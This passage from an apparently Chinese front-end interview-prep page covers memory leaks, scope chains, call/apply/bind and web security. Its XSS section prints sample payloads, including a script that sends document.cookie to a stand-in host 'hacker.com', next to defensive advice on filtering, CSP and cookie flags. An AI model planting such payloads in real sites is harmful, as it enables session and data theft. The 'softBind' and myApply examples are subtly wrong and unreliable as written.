<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h3 id="_4、​事件监听未移除​​"><a href="#_4、​事件监听未移除​​" class="header-anchor">#</a> 4、​事件监听未移除​​</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'scroll'</span><span class="token punctuation">,</span> heavyFunction<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 忘记 removeEventListener</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="_5、未释放的websocket-订阅"><a href="#_5、未释放的websocket-订阅" class="header-anchor">#</a> 5、未释放的WebSocket/订阅</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">'ws://example.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

socket<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// 组件卸载时忘记关闭</span>
<span class="token comment">// socket.close();</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h3 id="内存泄露排查工具"><a href="#内存泄露排查工具" class="header-anchor">#</a> 内存泄露排查工具</h3> <ul><li><p>Chrome DevTools Memory 面板​​：</p> <ul><li>拍摄堆快照（Heap Snapshot）对比前后差异。</li> <li>使用 Allocation Timeline 跟踪内存分配。</li></ul></li> <li><p>Node.js 内存分析​​：</p></li></ul> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">node</span> --inspect-brk --expose-gc app.js
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>通过 Chrome DevTools 连接调试。</p> <h2 id="_18-作用域链"><a href="#_18-作用域链" class="header-anchor">#</a> 18. 作用域链</h2> <h3 id="一-作用域基础概念"><a href="#一-作用域基础概念" class="header-anchor">#</a> 一. 作用域基础概念</h3> <ul><li>作用域类型
<ul><li><strong>全局作用域​</strong>​：在任何函数外部定义的变量</li> <li>​<strong>​函数作用域</strong>​​：在函数内部定义的变量（var声明的变量）</li> <li>​<strong>块级作用域​</strong>​：ES6引入的let和const的作用域（{}内部）</li></ul></li> <li>作用域特点
<ul><li>​<strong>​词法作用域​​（静态作用域）​</strong>：作用域在代码编写时就已经确定</li> <li>​<strong>​作用域链​​​</strong>：变量查找的机制</li></ul></li></ul> <h3 id="二-作用域链的组成"><a href="#二-作用域链的组成" class="header-anchor">#</a> 二. 作用域链的组成</h3> <h4 id="_1-执行上下文-execution-context"><a href="#_1-执行上下文-execution-context" class="header-anchor">#</a> 1. 执行上下文（Execution Context）</h4> <p>每个函数调用都会创建一个执行上下文，包含：</p> <ul><li>​​变量对象​​（Variable Object，VO）</li> <li>​作用域链​​（Scope Chain）</li> <li>this值</li></ul> <h4 id="_2-作用域链构建过程"><a href="#_2-作用域链构建过程" class="header-anchor">#</a> 2. 作用域链构建过程</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">outer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  
  <span class="token keyword">function</span> <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>
  <span class="token punctuation">}</span>
  
  <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">outer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><ul><li>作用域链结构​​：
<ul><li>inner作用域链: [inner的VO, outer的VO, 全局VO]</li> <li>outer作用域链: [outer的VO, 全局VO]</li> <li>全局作用域链: [全局VO]</li></ul></li></ul> <h3 id="三、变量查找机制"><a href="#三、变量查找机制" class="header-anchor">#</a> 三、变量查找机制</h3> <ul><li>当访问一个变量时，JavaScript引擎会：
<ul><li>在当前执行上下文的变量对象中查找</li> <li>如果没找到，沿着作用域链向上查找</li> <li>直到全局作用域，如果仍未找到则报错</li></ul></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> globalVar <span class="token operator">=</span> <span class="token string">'global'</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">outer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> outerVar <span class="token operator">=</span> <span class="token string">'outer'</span><span class="token punctuation">;</span>
  <span class="token keyword">function</span> <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> innerVar <span class="token operator">=</span> <span class="token string">'inner'</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>innerVar<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 'inner' (当前作用域)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>outerVar<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 'outer' (父作用域)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>globalVar<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 'global' (全局作用域)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>notExist<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// ReferenceError</span>
  <span class="token punctuation">}</span>
  <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">outer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h3 id="调试技巧"><a href="#调试技巧" class="header-anchor">#</a> 调试技巧</h3> <p>查看作用域链</p> <ul><li>在Chrome DevTools中：
<ul><li>设置断点</li> <li>在Scope面板查看作用域链</li></ul></li></ul> <h2 id="_19-call、apply-和-bind-的理解"><a href="#_19-call、apply-和-bind-的理解" class="header-anchor">#</a> 19. call、apply 和 bind 的理解</h2> <h4 id="call、apply-和-bind-是-function-对象自带的三个方法-属于对象冒充-可以调用另外一个对象的方法-同时改变函数体内部-this-的指向。"><a href="#call、apply-和-bind-是-function-对象自带的三个方法-属于对象冒充-可以调用另外一个对象的方法-同时改变函数体内部-this-的指向。" class="header-anchor">#</a> call、apply 和 bind 是 Function 对象自带的三个方法，属于对象冒充，可以调用另外一个对象的方法，同时改变函数体内部 this 的指向。</h4> <p>call(obj, arg1, arg2) → 立即执行<br>
apply(obj, [arg1, arg2]) → 立即执行<br>
bind(obj)(arg1, arg2) → 返回绑定后的函数</p> <table><thead><tr><th style="text-align:center;">方法</th> <th style="text-align:center;">调用时机</th> <th style="text-align:center;">参数传递方式</th> <th style="text-align:center;">返回值</th></tr></thead> <tbody><tr><td style="text-align:center;">call</td> <td style="text-align:center;">立即调用</td> <td style="text-align:center;">单独传递</td> <td style="text-align:center;">函数执行结果</td></tr> <tr><td style="text-align:center;">apply</td> <td style="text-align:center;">立即调用</td> <td style="text-align:center;">数组形式传递</td> <td style="text-align:center;">函数执行结果</td></tr> <tr><td style="text-align:center;">bind</td> <td style="text-align:center;">不立即调用</td> <td style="text-align:center;">单独传递或部分传递</td> <td style="text-align:center;">绑定后的新函数</td></tr></tbody></table> <h4 id="bind-硬绑定-和softbind-软绑定"><a href="#bind-硬绑定-和softbind-软绑定" class="header-anchor">#</a> bind(硬绑定)和softbind(软绑定)</h4> <ul><li>标准 bind 方法
<ul><li>​​硬性绑定​​：一旦绑定，无法更改 this 值</li> <li>​立即执行​​：返回一个新函数，调用时固定 this</li></ul></li> <li>softBind 概念
<ul><li>解决 bind 的硬性绑定问题，允许在调用时​​动态覆盖​​ this 值</li></ul></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> obj1 <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Alice'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> obj2 <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Bob'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">showName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">const</span> hardBound <span class="token operator">=</span> <span class="token function">showName</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>obj1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">hardBound</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &quot;Alice&quot; (无法覆盖)</span>

<span class="token keyword">const</span> softBound <span class="token operator">=</span> showName<span class="token punctuation">.</span><span class="token function">softBind</span><span class="token punctuation">(</span>obj1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">softBound</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &quot;Bob&quot; (可覆盖)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p><code>softbind</code> 实现原理（简化版）</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">myBind</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">context<span class="token punctuation">,</span> <span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> fn <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>innerArgs</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token operator">...</span>args<span class="token punctuation">,</span> <span class="token operator">...</span>innerArgs<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h4 id="自己动手实现-call-方法"><a href="#自己动手实现-call-方法" class="header-anchor">#</a> 自己动手实现 call 方法</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">myCall</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">context<span class="token punctuation">,</span> <span class="token operator">...</span>arg</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> obj <span class="token operator">=</span> context <span class="token operator">||</span> window<span class="token punctuation">;</span>
  obj<span class="token punctuation">.</span>fn <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> result <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token operator">...</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">delete</span> obj<span class="token punctuation">.</span>fn<span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h4 id="自己动手实现-apply-方法"><a href="#自己动手实现-apply-方法" class="header-anchor">#</a> 自己动手实现 apply 方法</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">myApply</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">context<span class="token punctuation">,</span> arg</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> obj <span class="token operator">=</span> context <span class="token operator">||</span> window<span class="token punctuation">;</span>
  obj<span class="token punctuation">.</span>fn <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> res<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>arg<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    res <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token operator">...</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    res <span class="token operator">=</span> obj<span class="token punctuation">.</span>fn<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">delete</span> obj<span class="token punctuation">.</span>fn<span class="token punctuation">;</span>
  <span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h4 id="实际应用场景"><a href="#实际应用场景" class="header-anchor">#</a> 实际应用场景</h4> <ul><li>1.借用方法：使用其他对象的方法</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> obj1 <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'obj1'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> obj2 <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'obj2'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">showName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">showName</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &quot;obj1&quot;</span>
<span class="token function">showName</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &quot;obj2&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><ul><li>2.类数组转为数组</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>3.延迟执行（bind）</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> button <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'button'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
button<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleClick</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h2 id="_20-web-安全"><a href="#_20-web-安全" class="header-anchor">#</a> 20. WEB 安全</h2> <h3 id="_1、xss-跨站脚本-cross-site-scripting"><a href="#_1、xss-跨站脚本-cross-site-scripting" class="header-anchor">#</a> 1、XSS：跨站脚本（Cross-site scripting）</h3> <p>XSS是一种​​注入型攻击​​，攻击者通过将恶意脚本注入到可信网页中，当用户访问该页面时，恶意脚本会在用户浏览器执行。</p> <ul><li>核心危害：
<ul><li>​窃取用户数据​​（Cookie、LocalStorage）</li> <li>​​会话劫持​​（冒充用户操作）</li> <li>​​钓鱼攻击​​（伪造登录表单）</li> <li>​蠕虫传播​​（自我复制的XSS）</li></ul></li></ul> <h4 id="xss-三大类型详解"><a href="#xss-三大类型详解" class="header-anchor">#</a> XSS 三大类型详解</h4> <p><strong>1. 存储型 XSS（最危险）</strong></p> <ul><li>攻击流程​​：
<ul><li>攻击者提交恶意内容到数据库（如论坛评论）</li> <li>服务器存储该内容</li> <li>其他用户访问包含该内容的页面</li> <li>恶意脚本自动执行</li></ul></li></ul> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token comment">&lt;!-- 提交到评论区的恶意内容 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://hacker.com/steal?cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><strong>2. 反射型 XSS（最常见）</strong></p> <ul><li>攻击流程​​：
<ul><li>用户点击恶意构造的URL：<code>https://victim.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></li> <li>服务端未过滤直接将q参数值返回到页面</li> <li>浏览器解析执行恶意脚本</li></ul></li></ul> <p><strong>3. DOM 型 XSS（最隐蔽）</strong></p> <ul><li>攻击流程​​：
<ul><li>攻击者构造特殊URL：<code>https://victim.com#&lt;img src=x onerror=alert(1)&gt;</code></li> <li>前端JS直接使用location.hash操作DOM</li> <li>触发恶意代码执行 <code>// document.getElementById('content').innerHTML = location.hash.substring(1);</code></li></ul></li></ul> <h4 id="xss-防御体系-深度防御"><a href="#xss-防御体系-深度防御" class="header-anchor">#</a> XSS 防御体系（深度防御）</h4> <p><strong>1. 输入过滤（服务端）</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">sanitize</span><span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// 移除所有HTML标签</span>
  <span class="token keyword">return</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;[^&gt;]*&gt;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token comment">// 或转义特殊字符</span>
  <span class="token comment">// return input.replace(/&amp;/g, '&amp;amp;')</span>
  <span class="token comment">//            .replace(/&lt;/g, '&amp;lt;')</span>
  <span class="token comment">//            .replace(/&gt;/g, '&amp;gt;');</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p><strong>2. 输出编码（上下文敏感）</strong></p> <p>HTML标签内 -&gt; HTML实体编码
HTML属性值 -&gt; HTML属性编码
JavaScript代码 -&gt; JavaScript Unicode转义
URL参数 -&gt; URL编码</p> <p><strong>3. 内容安全策略（CSP）</strong></p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">Content-Security-Policy</span><span class="token punctuation">:</span> <span class="token header-value csp languages-csp">
  default-src 'self';
  script-src 'self' 'unsafe-inline' cdn.example.com;
  img-src *;
  connect-src https://api.example.com;
  frame-ancestors 'none';
  report-uri /csp-report;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p><strong>4. 安全Cookie设置</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>Set<span class="token operator">-</span>Cookie<span class="token operator">:</span> sessionId<span class="token operator">=</span>xxxx<span class="token punctuation">;</span> 
  HttpOnly<span class="token punctuation">;</span>  <span class="token comment">// 禁止JS访问</span>
  Secure<span class="token punctuation">;</span>    <span class="token comment">// 仅HTTPS传输</span>
  SameSite<span class="token operator">=</span>Lax<span class="token punctuation">;</span> <span class="token comment">// 限制跨站发送</span>
  Path<span class="token operator">=</span><span class="token operator">/</span><span class="token punctuation">;</span> 
  Max<span class="token operator">-</span>Age<span class="token operator">=</span><span class="token number">3600</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p><strong>5. 现代框架防护机制</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// React</span>
<span class="token operator">&lt;</span>div<span class="token operator">&gt;</span><span class="token punctuation">{</span>userInput<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span> <span class="token punctuation">{</span><span class="token comment">/* 自动转义 */</span><span class="token punctuation">}</span>
<span class="token operator">&lt;</span>div dangerouslySetInnerHTML<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token literal-property property">__html</span><span class="token operator">:</span> sanitizedHTML<span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span><span class="token comment">/* 需手动净化 */</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// Vue​​</span>
<span class="token operator">&lt;</span>template<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">{</span> userInput <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 自动转义 <span class="token operator">--</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>div v<span class="token operator">-</span>html<span class="token operator">=</span><span class="token string">&quot;sanitizedHTML&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 需手动净化 <span class="token operator">--</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h3 id="_2、csrf-跨站请求伪造-cross-site-request-forgery"><a href="#_2、csrf-跨站请求伪造-cross-site-request-forgery" class="header-anchor">#</a> 2、CSRF：跨站请求伪造（Cross-site request forgery）</h3> <p>CSRF 的攻击主要是在用户不知情的情况下，冒充用户偷偷发了请求</p> <ul><li><p>要完成一次 CSRF 攻击，受害者必须依次完成两个步骤：<br>
1、登录受信任网站 A，并在本地生成 Cookie<br>
2、在不登出 A 的情况下，访问危险网站 B。</p></li> <li><p>CSRF 防御措施：<br>
1、检测 http referer 是否是同域名<br>
2、避免登录的 session 长时间存储在客户端中<br>
3、关键请求使用验证码或者 token 机制</p></li></ul> <h2 id="_21-cookies-sessionstorage-和-localstorage-的区别"><a href="#_21-cookies-sessionstorage-和-localstorage-的区别" class="header-anchor">#</a> 21.cookies，sessionStorage 和 localStorage 的区别</h2> <p><strong>共同点：都是保存在浏览器端，且同源的</strong></p> <table><thead><tr><th style="text-align:center;">特性​</th> <th style="text-align:center;">​​Cookies​</th> <th style="text-align:center;">​​sessionStorage​</th> <th style="text-align:center;">​​localStorage​</th></tr></thead> <tbody><tr><td style="text-align:center;">​​存储容量​</td> <td style="text-align:center;">每个域名约 50-150 个, 4KB 左右</td> <td style="text-align:center;">5-10MB（不同浏览器不同）</td> <td style="text-align:center;">5-10MB（甚至更大）</td></tr> <tr><td style="text-align:center;">生命周期​</td> <td style="text-align:center;">可设置过期时间（默认会话级，关闭浏览器后清除）<br> 通过 expires 或 max-age 设置过期时间</td> <td style="text-align:center;">​​会话级​​（关闭标签页清除）</td> <td style="text-align:center;">​永久存储​​（需手动清除）</td></tr> <tr><td style="text-align:center;">作用域​</td> <td style="text-align:center;">同域名下所有标签页共享</td> <td style="text-align:center;">​仅当前标签页​</td> <td style="text-align:center;">同域名下所有标签页共享</td></tr> <tr><td style="text-align:center;">同步行为</td> <td style="text-align:center;">修改后立即同步</td> <td style="text-align:center;">完全不共享</td> <td style="text-align:center;">需通过 storage 事件监听同步</td></tr> <tr><td style="text-align:center;">​​是否随请求发送​</td> <td style="text-align:center;">是（自动附加到 HTTP 请求头）</td> <td style="text-align:center;">否</td> <td style="text-align:center;">否</td></tr> <tr><td style="text-align:center;">​典型用途</td> <td style="text-align:center;">用户认证、会话跟踪</td> <td style="text-align:center;">临时表单数据、页面间传参</td> <td 